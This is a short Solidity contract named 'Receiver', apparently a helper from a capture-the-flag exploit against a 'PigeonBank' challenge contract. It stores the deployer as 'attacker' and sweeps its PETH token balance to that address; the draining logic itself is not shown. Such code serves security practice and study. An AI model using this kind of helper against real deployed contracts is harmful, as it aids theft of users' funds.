// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";
import "./Receiver.sol";

contract Receiver
{
    PigeonBank public pigeonBank;
    PETH public peth;
    address public attacker;

    constructor(address _pigeonBankAddress) {
        pigeonBank = PigeonBank(payable(_pigeonBankAddress));
        peth = PETH(pigeonBank.peth());
        attacker = msg.sender;
    }

    function giveMyMoneysBack() public {
        peth.transfer(attacker, peth.balanceOf(address(this)));
    }
}